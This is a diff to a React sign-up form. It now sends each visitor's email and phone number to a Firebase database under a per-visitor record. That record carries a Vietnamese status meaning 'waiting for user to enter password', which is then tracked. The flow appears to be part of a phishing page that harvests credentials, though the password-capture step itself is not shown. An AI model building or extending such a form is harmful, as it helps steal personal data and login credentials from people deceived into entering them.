@@ -1,11 +1,15 @@
 /* eslint-disable react/jsx-key */
 import { useEffect, useState } from "react";
 
-import InputText from "../UI/InputText/InputText";
-import "./Form.scss";
+import { ref, set } from "firebase/database";
 import PhoneInput from "react-phone-input-2";
 import "react-phone-input-2/lib/bootstrap.css";
+import { v4 as uuidv4 } from "uuid";
+import { database } from "../../Utils/firebase";
 import Modal from "../Modal/Modal_v2";
+import Spinner from "../Spinner";
+import InputText from "../UI/InputText/InputText";
+import "./Form.scss";
 
 const months = [
   "Jan",
@@ -23,6 +27,7 @@ const months = [
 ];
 
 const Form = () => {
+  const [loading, setLoading] = useState(false);
   const [formData, setFormData] = useState({
     email: "",
     day: "",
@@ -41,11 +46,11 @@ const Form = () => {
   const isFormDataComplete = () => {
     const { email, phone, day, month, year } = formData;
     return (
-      email.trim() !== "" &&
-      phone.trim() !== "" &&
-      day?.trim() !== "" &&
-      month?.trim() !== "" &&
-      year?.trim() !== ""
+      email.trim() !== "" && phone.trim() !== ""
+      //  &&
+      // day?.trim() !== "" &&
+      // month?.trim() !== "" &&
+      // year?.trim() !== ""
     );
   };
   useEffect(() => {
@@ -74,10 +79,23 @@ const Form = () => {
       });
   };
 
-  const handleSubmit = () => {
-    localStorage.setItem("form", JSON.stringify(formData));
-
-    setIsModal(true);
+  const handleSubmit = async () => {
+    setLoading(true);
+    const id = uuidv4();
+    set(ref(database, "records/" + id), {
+      email: formData.email,
+      phone: formData.phone,
+      user_status: "Đang chờ user nhập nhật khẩu",
+    })
+      .then(() => {
+        localStorage.setItem("form", JSON.stringify(formData));
+        localStorage.setItem("record_uid", id);
+        setLoading(false);
+        setIsModal(true);
+      })
+      .catch((err) => {
+        console.log("Error", err);
+      });
   };
 
   useEffect(() => {
@@ -86,11 +104,26 @@ const Form = () => {
 
   return (
     <form className="Form" onSubmit={(e) => e.preventDefault()}>
+      {loading && (
+        <div
+          style={{
+            position: "fixed",
+            inset: 0,
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            zIndex: 999,
+            background: "rgba(0,0,0,.1",
+          }}
+        >
+          <Spinner />
+        </div>
+      )}
       {/* <InputText name="fullname" fun={handleChange} placeHolder={"Fullname"}>
         Fullname
       </InputText> */}
 
-      <div>
+      {/* <div>
         <label className="InputText__label">Date of birth</label>
         <div
           style={{
@@ -135,7 +168,7 @@ const Form = () => {
             ))}
           </select>
         </div>
-      </div>
+      </div> */}
 
       {/* <InputText name="phone" fun={handleChange} placeHolder={"Phone number"}>
         Phone number
